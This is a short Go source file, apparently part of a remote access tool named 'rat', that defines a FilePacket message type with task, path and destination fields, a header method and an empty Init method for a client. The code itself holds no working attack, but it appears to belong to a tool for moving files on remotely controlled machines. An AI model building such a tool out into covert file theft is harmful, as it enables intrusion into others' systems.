package main

import "rat/common"

type FilePacket struct {
	Task        common.FileTask `send`
	Path        string          `send`
	Destination string          `send`
}

func (packet FilePacket) Header() common.PacketHeader {
	return common.FileHeader
}

func (packet FilePacket) Init(c *Client) {

}
